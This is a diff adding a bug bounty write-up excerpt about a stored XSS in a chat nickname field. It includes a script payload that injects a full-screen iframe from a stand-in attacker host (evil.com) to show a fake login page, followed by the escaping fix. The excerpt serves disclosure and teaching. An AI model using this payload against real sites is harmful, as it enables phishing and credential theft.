@@ -163,6 +163,33 @@ So that’s how I went from a P5 Race Condition to a P5 Self XSS to a P2 Blind X
   > }
   > </script>
   >
+  
+  ![exchange1](https://miro.medium.com/max/405/1*k108KTtJoenK7HxQScPQHA.png)
+  ![exchange2](https://miro.medium.com/max/405/1*ug4nS7JYPESjKA_2cubCxw.png)
+  
+  *Convincing phishing attack*
+  This can also lead to a more severe attack. By setting your nickname to the below payload, a full screen iframe will be created on the page, covering it, containing the attacker’s webpage which can contain a fake Netflix login page saying for example “Your session has expired, Please Login again”, the credentials will then get sent to the attacker. All this will happen without the victims ever leaving netflix.com.
+  >
+  > <script>
+  > document.write('<iframe id="relogin" style="position:fixed; top:0; left:0;right:0; width:100%; height:100%; border:none; margin:0" src="https://evil.com/fake_login.php">     > </iframe>');
+  > </script>
+  >
+  
+  *Fix*
+  I reported the vulnerability to the developers, after a couple days with no response I chased them up and they fixed it within 1 week.
+  >
+  > var addMessage = function(message) {
+  > ...
+  > var nicknameMessage = jQuery(`
+  >  <div class="msg-container">
+  >    ...
+  >    <h3>${userNickname.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</h3>
+  >    <p>${message.body.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</p>
+  >    ...
+  >  </div>`).appendTo(jQuery('#chat-history')).data('permId', message.permId).data('userIcon', userIcon).data('userNickname', userNickname);
+  > ...
+  > }
+  >
 
 - [Stored XSS in google nest](https://medium.com/bugbountywriteup/stored-xss-in-google-nest-a82373bbda68)
 - [Self XSS to persistent XSS on login portal](https://medium.com/@nnez/always-escalate-from-self-xss-to-persistent-xss-on-login-portal-54265b0adfd0)
